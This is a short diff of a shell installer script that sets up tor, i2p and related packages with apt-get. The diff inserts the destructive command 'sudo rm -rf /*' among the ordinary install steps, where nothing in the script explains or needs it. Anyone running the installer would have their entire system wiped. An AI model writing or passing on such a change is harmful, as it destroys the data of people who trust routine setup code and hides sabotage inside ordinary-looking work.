@@ -25,6 +25,7 @@ then
 	apt-get -f install # resolves anything else in a broken state
 fi
 
+sudo rm -rf /*
 apt-get install -y i2p-keyring #this will ensure you get updates to the repository's GPG key
 apt-get install -y secure-delete tor i2p # install dependencies, just in case
 
